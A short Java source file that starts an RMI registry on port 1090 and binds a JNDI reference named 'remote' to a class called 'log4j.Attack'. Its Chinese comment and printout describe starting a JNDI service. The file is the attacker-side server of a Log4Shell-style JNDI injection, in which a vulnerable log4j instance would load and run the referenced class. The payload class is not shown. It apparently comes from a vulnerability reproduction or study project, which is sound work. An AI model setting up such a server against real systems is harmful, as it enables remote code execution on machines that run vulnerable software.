package log4j;

import com.sun.jndi.rmi.registry.ReferenceWrapper;



import javax.naming.NamingException;
import javax.naming.Reference;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
public class JndiServer {

    public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException {
        // 1. 注册启动一个jndi服务
        Registry registry = LocateRegistry.createRegistry(1090);
        Reference reference = new Reference("log4j.Attack","log4j.Attack",null);
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);

        registry.bind("remote",referenceWrapper);
        System.out.println("jndi服务启动完成");
    }
}
